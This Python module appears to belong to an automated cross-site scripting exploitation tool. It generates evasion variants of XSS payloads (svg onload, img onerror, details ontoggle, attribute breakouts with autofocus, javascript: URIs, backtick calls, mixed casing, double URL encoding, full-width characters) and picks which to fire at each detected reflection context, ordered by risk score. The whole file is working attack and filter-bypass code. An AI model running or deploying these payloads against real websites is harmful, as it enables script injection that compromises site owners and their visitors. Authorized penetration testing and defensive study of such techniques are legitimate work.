"""Phase 1 mechanical XSS payload transforms — no AI required.

Each transform applies a single evasion technique to a base payload string.
Transforms are context-aware: the apply_for_context() function returns only
the variants that make sense for the detected reflection context.

Design:
  - Base payloads come from probe.py's payloads_for_probe_result() which are
    already shaped correctly for the sink context.
  - We then apply each transform on top to produce evasion variants.
  - The executor fires them one by one; first confirmed execution wins.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Callable
from urllib.parse import quote as url_quote


@dataclass(slots=True)
class TransformVariant:
    transform_name: str
    payload: str


# ---------------------------------------------------------------------------
# Individual transform functions
# Each takes a raw payload string and returns the transformed version,
# or None if the transform is not applicable to this payload.
# ---------------------------------------------------------------------------

def _raw(p: str) -> str | None:
    return p


def _url_encode(p: str) -> str | None:
    return url_quote(p, safe="")


def _double_url_encode(p: str) -> str | None:
    return url_quote(url_quote(p, safe=""), safe="")


def _html_entity_encode(p: str) -> str | None:
    """HTML-entity encode < and > only — useful when those chars survive other ways."""
    return p.replace("<", "&#60;").replace(">", "&#62;")


def _mixed_case_tags(p: str) -> str | None:
    """Randomly alternate case on tag names: <script> → <sCrIpT>."""
    import re
    def _case_tag(m: re.Match) -> str:
        name = m.group(1)
        cased = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(name))
        return m.group(0).replace(name, cased, 1)
    result = re.sub(r"<(/?)([a-zA-Z][a-zA-Z0-9]*)", lambda m: f"<{m.group(1)}" + _case_tag_name(m.group(2)), p)
    return result if result != p else None


def _case_tag_name(name: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(name))


def _mixed_case_events(p: str) -> str | None:
    """Case-mix event handler names: onerror= → oNeRrOr=."""
    import re
    def _case_event(m: re.Match) -> str:
        ev = m.group(0)
        return _case_tag_name(ev)
    result = re.sub(r"on[a-zA-Z]+(?==)", _case_event, p, flags=re.IGNORECASE)
    return result if result != p else None


def _svg_tag(p: str) -> str | None:
    """Replace <img>/<script> with SVG onload variant."""
    if "alert" not in p and "fetch" not in p:
        return None
    # Extract the JS expression if possible; fallback to alert(1)
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return f"<svg onload={expr}>"


def _img_onerror(p: str) -> str | None:
    """Replace with <img src=x onerror=...> variant."""
    if "alert" not in p and "fetch" not in p:
        return None
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return f"<img src=x onerror={expr}>"


def _no_space(p: str) -> str | None:
    """Remove spaces before = in event handlers: onload = → onload=."""
    import re
    result = re.sub(r"(on\w+)\s*=\s*", r"\1=", p)
    # Also try tag/onload without space: <svg/onload=...>
    result = re.sub(r"<(\w+)\s+(on\w+=)", r"<\1/\2", result)
    return result if result != p else None


def _backtick_call(p: str) -> str | None:
    """Replace alert(...) → alert`...` to avoid parenthesis filters."""
    import re
    result = re.sub(r"(alert|confirm|prompt)\(([^)]*)\)", r"\1`\2`", p)
    return result if result != p else None


def _autofocus_onfocus(p: str) -> str | None:
    """For attribute contexts: inject onfocus + autofocus."""
    if "alert" not in p and "fetch" not in p:
        return None
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return f'" onfocus="{expr}" autofocus="'


def _details_ontoggle(p: str) -> str | None:
    """<details open ontoggle=...> — fires without user interaction."""
    if "alert" not in p and "fetch" not in p:
        return None
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return f"<details open ontoggle={expr}>"


def _full_width_chars(p: str) -> str | None:
    """Substitute ASCII chars with Unicode full-width equivalents in tag names."""
    # Full-width map for a-z (some WAFs check ASCII only)
    fw_map = {chr(c): chr(0xFF01 + c - 0x21) for c in range(0x21, 0x7F)}
    # Only transform inside tag names, not the whole payload
    import re
    def _fw_tag(m: re.Match) -> str:
        return "".join(fw_map.get(ch, ch) for ch in m.group(0))
    result = re.sub(r"(?<=<)[a-zA-Z]+", _fw_tag, p)
    return result if result != p else None


def _js_uri(p: str) -> str | None:
    """javascript: URI — only useful for href/src/action contexts."""
    if "alert" not in p and "fetch" not in p:
        return None
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return f"javascript:{expr}"


def _template_literal(p: str) -> str | None:
    """${...} template expression — only useful inside JS template literal contexts."""
    if "alert" not in p and "fetch" not in p:
        return None
    import re
    m = re.search(r"(alert\([^)]*\)|fetch\([^)]*\))", p)
    expr = m.group(1) if m else "alert(document.domain)"
    return "${" + expr + "}"


# ---------------------------------------------------------------------------
# Context-aware transform table
# Maps sink context → list of (name, fn) to try, in order
# ---------------------------------------------------------------------------

_HTML_BODY_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("svg_tag",         _svg_tag),
    ("img_onerror",     _img_onerror),
    ("details_toggle",  _details_ontoggle),
    ("mixed_case_tags", _mixed_case_tags),
    ("mixed_case_ev",   _mixed_case_events),
    ("no_space",        _no_space),
    ("backtick_call",   _backtick_call),
    ("url_encode",      _url_encode),
    ("double_url",      _double_url_encode),
    ("html_entity",     _html_entity_encode),
    ("full_width",      _full_width_chars),
]

_HTML_ATTR_VALUE_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("autofocus",       _autofocus_onfocus),
    ("mixed_case_ev",   _mixed_case_events),
    ("no_space",        _no_space),
    ("backtick_call",   _backtick_call),
    ("url_encode",      _url_encode),
    ("double_url",      _double_url_encode),
]

_HTML_ATTR_URL_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("js_uri",          _js_uri),
    ("url_encode",      _url_encode),
    ("double_url",      _double_url_encode),
    ("mixed_case_tags", _mixed_case_tags),
]

_HTML_ATTR_EVENT_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("backtick_call",   _backtick_call),
    ("mixed_case_ev",   _mixed_case_events),
    ("url_encode",      _url_encode),
]

_JS_CONTEXT_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("backtick_call",   _backtick_call),
    ("url_encode",      _url_encode),
    ("double_url",      _double_url_encode),
    ("template_lit",    _template_literal),
]

_JS_STRING_TRANSFORMS: list[tuple[str, Callable]] = [
    ("raw",             _raw),
    ("backtick_call",   _backtick_call),
    ("url_encode",      _url_encode),
    ("double_url",      _double_url_encode),
]

_CONTEXT_MAP: dict[str, list[tuple[str, Callable]]] = {
    "html_body":        _HTML_BODY_TRANSFORMS,
    "html_comment":     _HTML_BODY_TRANSFORMS,
    "html_attr_value":  _HTML_ATTR_VALUE_TRANSFORMS,
    "html_attr_url":    _HTML_ATTR_URL_TRANSFORMS,
    "html_attr_event":  _HTML_ATTR_EVENT_TRANSFORMS,
    "js_code":          _JS_CONTEXT_TRANSFORMS,
    "js_string_dq":     _JS_STRING_TRANSFORMS,
    "js_string_sq":     _JS_STRING_TRANSFORMS,
    "js_string_bt":     _JS_STRING_TRANSFORMS,
    "json_value":       _JS_STRING_TRANSFORMS,
}


def apply_for_context(base_payload: str, context_type: str) -> list[TransformVariant]:
    """Return all transform variants for *base_payload* in *context_type*.

    Deduplicates: if two transforms produce the same string, only the first
    is kept.  Always starts with "raw" (no transform) as the baseline.
    """
    transforms = _CONTEXT_MAP.get(context_type, _HTML_BODY_TRANSFORMS)
    seen: set[str] = set()
    variants: list[TransformVariant] = []

    for name, fn in transforms:
        try:
            result = fn(base_payload)
        except Exception:
            continue
        if result is None or result in seen:
            continue
        seen.add(result)
        variants.append(TransformVariant(transform_name=name, payload=result))

    return variants


def all_variants_for_probe(probe_result: "ProbeResult") -> list[tuple[str, str, list[TransformVariant]]]:  # noqa: F821
    """Return (param_name, context_type, variants) for every injectable reflection
    found in *probe_result*.

    Strategy:
    - Generator payloads (tag="gen_gen") are already char-filtered, context-targeted,
      and carry per-call random casing.  They are used directly as TransformVariants
      with transform_name="gen_gen" — no further transform layer is applied on top,
      because doing so would be redundant casing variation on already-varied payloads.
    - All other (non-gen_gen) payloads go through the existing transform layer
      (url_encode, double_url, mixed_case_tags, etc.) with a small base cap to keep
      the total request count sane.

    The combined list is sorted by risk_score descending so highest-confidence
    payloads fire first.
    """
    from ai_xss_generator.probe import payloads_for_probe_result

    # How many non-gen_gen base payloads to expand through the transform layer.
    _TRANSFORM_BASE_CAP = 5

    out: list[tuple[str, str, list[TransformVariant]]] = []

    # fast_omni synthetic context — return a single empty-variants tuple so the
    # caller can bypass the transform layer and go straight to cloud generation.
    if any(ctx.context_type == "fast_omni" for ctx in probe_result.reflections):
        out.append((probe_result.param_name, "fast_omni", []))
        return out

    base_payloads = payloads_for_probe_result(probe_result)

    for ctx in probe_result.reflections:
        if not ctx.is_exploitable:
            continue
        context_type = ctx.context_type

        # Split payloads into gen_gen (fire directly) vs others (expand via transforms)
        ctx_payloads = [
            p for p in base_payloads
            if ctx.context_type in (p.target_sink or "")
        ]
        if not ctx_payloads:
            ctx_payloads = list(base_payloads)

        gen_payloads = [p for p in ctx_payloads if "gen_gen" in p.tags]
        other_payloads = [p for p in ctx_payloads if "gen_gen" not in p.tags]

        all_variants: list[TransformVariant] = []
        seen_payloads: set[str] = set()

        # --- gen_gen payloads: fire directly, sorted by risk_score desc ---
        for p in sorted(gen_payloads, key=lambda x: -x.risk_score):
            if p.payload not in seen_payloads:
                seen_payloads.add(p.payload)
                all_variants.append(TransformVariant(
                    transform_name="gen_gen",
                    payload=p.payload,
                ))

        # --- other payloads: expand through the evasion transform layer ---
        for base_p in other_payloads[:_TRANSFORM_BASE_CAP]:
            for variant in apply_for_context(base_p.payload, context_type):
                if variant.payload not in seen_payloads:
                    seen_payloads.add(variant.payload)
                    all_variants.append(variant)

        if all_variants:
            out.append((probe_result.param_name, context_type, all_variants))

    return out
